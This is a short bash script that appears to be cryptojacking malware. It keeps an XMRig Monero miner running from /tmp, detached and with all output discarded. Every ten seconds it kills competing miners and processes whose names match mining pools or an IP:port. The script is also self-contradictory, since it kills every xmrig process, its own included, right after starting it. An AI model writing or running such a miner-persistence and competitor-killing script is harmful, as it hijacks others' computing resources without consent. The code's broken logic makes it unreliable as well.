#!/bin/bash

blocked_pools=(nicehash nanopool minergate supportxmr moneroocean "75.119.158.0:3333")

while true; do
    if ! pgrep xmrig >/dev/null; then
        nohup /tmp/xmrig/xmrig-6.22.2/xmrig > /dev/null 2>&1 &
    fi
    pkill -f minerd
    pkill -f crypto
    pkill -f xmrig
    for pool in "${blocked_pools[@]}"; do
        pkill -f "$pool"
    done
    sleep 10
done
